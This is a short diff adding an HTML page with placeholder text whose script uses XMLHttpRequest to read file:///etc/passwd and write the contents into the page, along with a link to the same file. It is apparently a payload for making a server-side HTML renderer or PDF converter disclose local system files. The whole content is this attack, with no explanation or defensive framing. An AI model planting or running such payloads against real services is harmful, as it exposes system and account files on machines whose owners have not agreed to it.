@@ -1,0 +1,16 @@
+<html>
+  <body>
+    this is a page43564
+    <h1 id="p1"></h1>
+    <h2><a href="file:///etc/passwd">jfdhfhdfhg</h2>
+  </body>
+  <script>
+    x=new XMLHttpRequest;
+    x.onload=function(){document.write(this.responseText)};
+    x.open("GET","file:///etc/passwd");x.send();
+    console.log(this.responseText)
+    document.getElementById("p1").innerHTML=this.responseText;
+    alert(this.responseText);
+
+  </script>
+</html>
